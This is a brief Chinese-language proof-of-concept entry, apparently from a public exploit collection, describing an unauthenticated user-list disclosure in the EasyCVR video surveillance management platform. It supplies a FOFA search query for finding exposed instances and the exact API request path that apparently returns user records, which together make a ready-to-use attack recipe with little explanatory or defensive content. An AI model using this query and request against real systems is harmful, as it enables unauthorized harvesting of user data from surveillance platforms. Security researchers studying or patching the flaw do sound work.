## EasyCVR 视频管理平台存在用户信息泄露
EasyCVR 智能视频监控综合管理平台是一种针对大中型用户在跨区域网络化视频监控集中管理领域的安防管理软件。它具备多项功能，包括信息资源管理、设备管理、用户管理、网络管理和安全管理。该平台能够实现监控中心对所有视频监控图像的集中管理，并支持多个品牌设备的联网，确保联网视频监控传输质量，并提供资源统一检索和数据共享的功能。

## fofa
```
title="EasyCVR"
```

## poc
```
/api/v1/userlist?pageindex=0&pagesize=10

```
![image](https://github.com/wy876/POC/assets/139549762/cc8c8dd3-bd7e-49a9-b22f-a6a97215cf6a)
